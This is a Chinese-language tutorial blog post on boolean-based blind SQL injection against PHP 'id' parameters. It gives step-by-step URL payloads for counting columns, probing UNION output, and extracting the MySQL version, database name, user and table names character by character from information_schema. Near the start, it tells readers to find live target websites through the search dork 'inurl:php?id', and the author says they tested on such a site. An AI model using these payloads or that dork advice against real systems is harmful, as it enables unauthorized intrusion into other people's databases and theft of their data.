---
title: 布尔盲注
toc: true
description: 简要介绍布尔盲注的流程，并介绍常用的函数以及注入流程中常用的 payload。
summary: 简要介绍布尔盲注的流程，并介绍常用的函数以及注入流程中常用的 payload。
categories:
    - websec
    - sql injection
date: 2019-07-27 17:13:17
tags:
---

鉴于 sqli-lib less 5 和 webug 的布尔注入都不太规范，我又懒得看 dvwa。于是，从网上找了个标准的布尔盲注的站点，自己测试了一下，这里就不在演示了。你可以使用 inurl:php?id 去百度或谷歌一些网站看看。

# 简介

在 [webug 的布尔注入](https://xuj.me/wiki/web_security/sql_injection/boolean_based_of_webug/)已经谈到了

# 布尔盲注常用函数

[字符串截取函数](https://www.cnblogs.com/lcamry/p/5504374.htm)

## 常用（摘抄自上面链接）

### left

left(string，n)得到字符串左部指定个数的字符，一般我在猜测字符串时使用，比如：有些网站习惯于将一些数据库名/表名定义成自己网站的名字或网址去掉符号，还有一些常见的定义库表的名字，如果我逐个字符猜了几个看到和那个有匹配，我就用 left 尝试去匹配一下，当然，直接用 left 一个一个字符猜也是可以的。

Sql 用例：

(1) left(database(), 1)>'a' 查看数据库的第一位，left(database(), 2)>'ab' 查看数据库名前二位。

left(version(), 1) > '5'

(2) 同样的 string 可以为自行构造的 sql 语句。

### substr

substr(string, start, length) 第一个参数为要处理的字符串，start 为开始位置，length 为截取的长度。

Sql 用例：

(1) substr(DATABASE(),1,1)>’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。

一般就用它来一个字符一个字符的猜。

### regexp 正则

这里，暂时还没用过，看下面链接吧，用到再说。

[sql 盲注之正则表达式攻击](https://www.cnblogs.com/lcamry/articles/5717442.html)

# 流程

### 猜字段

```php
?id=10 order by 14--+
```

### 看显示位

```php
?id=-10 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 --+
```

看看有没有显示位，**_一定注意：_**把 id = 10 改成 id = -10，让前面查询无果(说道这里，大声哭泣..)，**如果有显示位就没必要盲注了**。

对于布尔盲注来说，当然是没有显示位了。

### 数据库版本

用 substr 一个个猜测，一般从 5 开始，5.6 和 5.7 比较常见，当然用 left 也一样。注意：版本中的逗点也算一个字符。

```php
?id=10 and left(version(),1)='5' --+

?id=10 and left(version(),3)='5.6' --+

?id=10 and left(version(),6)='5.6.19' --+
```

### 猜当前数据库名

```php
?id=10 and ascii(substr(database(),1,1))>97 --+
```

二分思想，通过看页面是否正常，一个个猜，逐渐逼近。

当然，如果前几个字母网站名或常用名，不妨直接猜测整体试试。

### 猜当前用户名

```php
?id=10 and length(user())>6 --+
```

有的网站使用：网站名@localhost 的形式，还是一句话，随机应变。

### 库中的表的个数

```php
?id=10 and (select count(table_name) from information_schema.tables where table_schema=database())>5 --+
```

### 爆表

#### 爆第一个表的长度

```php
?id=10 and (select length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9) --+
```

#### 爆表的名称

```php
?id=10 and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97) --+
```

后面就不详细讲了，参考回显注入语句与上面语句自己构造就好了。
